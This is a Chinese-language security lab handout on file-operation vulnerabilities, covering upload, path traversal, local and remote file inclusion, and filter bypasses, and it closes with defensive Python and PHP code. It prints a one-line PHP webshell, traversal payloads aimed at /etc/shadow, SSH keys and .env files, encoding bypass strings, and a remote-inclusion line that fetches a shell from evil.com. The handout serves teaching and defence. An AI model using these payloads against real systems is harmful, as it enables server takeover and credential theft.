# 📁 实验手册：文件操作漏洞

### 0. 序言
文件系统是服务器的"内脏"，而文件操作漏洞就是让攻击者能够"掏心掏肺"。上传恶意文件、读取敏感配置、遍历目录结构——每一个都是致命的。

*   **文件操作漏洞**：涉及文件上传、下载、读取、包含等操作中的安全缺陷。
*   **核心思想**：服务器信任了用户提供的文件名或路径。

本章目标：**理解为什么一个 `../` 就能读取 `/etc/passwd`。**

---

### 1. 文件上传漏洞

**危险在哪**：
上传一个 WebShell，获得服务器完全控制权。

**经典攻击**：
```php
// evil.php
<?php system($_GET['cmd']); ?>

// 上传后访问
http://target.com/uploads/evil.php?cmd=whoami
```

**绕过技巧**：
```
1. 双扩展名：shell.php.jpg
2. 大小写：shell.PhP
3. 特殊后缀：shell.php5, shell.phtml
4. 截断：shell.php%00.jpg (旧版本)
5. Content-Type 伪造
6. 图片马：在图片中嵌入代码
```

---

### 2. 路径遍历（目录穿越）

**原理**：
利用 `../` 序列跳出预期目录，访问任意文件。

**攻击示例**：
```
# 正常请求
GET /download?file=report.pdf

# 路径遍历攻击
GET /download?file=../../../etc/passwd
GET /download?file=....//....//....//etc/passwd
GET /download?file=..%2f..%2f..%2fetc/passwd
```

**常见目标文件**：
```
Linux: /etc/passwd, /etc/shadow, ~/.ssh/id_rsa
Windows: C:\Windows\win.ini, C:\boot.ini
应用配置: ../application.yml, ../.env
```

---

### 3. 文件包含漏洞

**本地文件包含（LFI）**：
```php
<?php include($_GET['page']); ?>

// 攻击
?page=../../../etc/passwd
?page=/var/log/apache2/access.log  // 结合日志注入
```

**远程文件包含（RFI）**：
```php
// 需要 allow_url_include=On
?page=http://evil.com/shell.txt
```

**LFI to RCE 技巧**：
```
1. 日志文件包含（Log Poisoning）
2. Session 文件包含
3. /proc/self/environ
4. PHP 伪协议：php://input, php://filter
```

---

### 4. 绕过技巧大全

**编码绕过**：
```
../  →  %2e%2e%2f
../  →  %2e%2e/
../  →  ..%252f (双重编码)
../  →  ....// (过滤替换绕过)
```

**空字节截断**（旧版本）：
```
shell.php%00.jpg
```

**路径规范化差异**：
```
Windows: ..\..\..\..\
混合：..\../..\..\
Unicode: %c0%ae%c0%ae/
```

---

### 5. 防御措施

**文件上传防御**：
```python
import os
import uuid

ALLOWED_EXTENSIONS = {'png', 'jpg', 'gif', 'pdf'}

def secure_upload(file):
    # 1. 检查扩展名（白名单）
    ext = file.filename.rsplit('.', 1)[-1].lower()
    if ext not in ALLOWED_EXTENSIONS:
        raise SecurityError("File type not allowed")
    
    # 2. 生成随机文件名
    new_filename = f"{uuid.uuid4()}.{ext}"
    
    # 3. 验证文件内容（magic bytes）
    # 4. 存储到非 Web 可访问目录
    # 5. 使用 CDN 或专门的文件服务
```

**路径遍历防御**：
```python
import os

def safe_path(base_dir, user_input):
    # 规范化路径
    full_path = os.path.normpath(os.path.join(base_dir, user_input))
    
    # 确保仍在基础目录内
    if not full_path.startswith(os.path.abspath(base_dir)):
        raise SecurityError("Path traversal detected")
    
    return full_path
```

**文件包含防御**：
```php
// 使用白名单
$allowed = ['home', 'about', 'contact'];
$page = $_GET['page'];
if (in_array($page, $allowed)) {
    include($page . '.php');
}
```

---

### 6. 结语

文件操作漏洞直接威胁服务器的文件系统安全。一个成功的文件上传可能导致服务器沦陷，一个路径遍历可能泄露所有配置和源代码。

记住：**永远不要信任用户提供的文件名和路径，永远使用白名单和路径规范化。**

---

**[准备好了吗？去探索服务器的"文件夹"吧]**
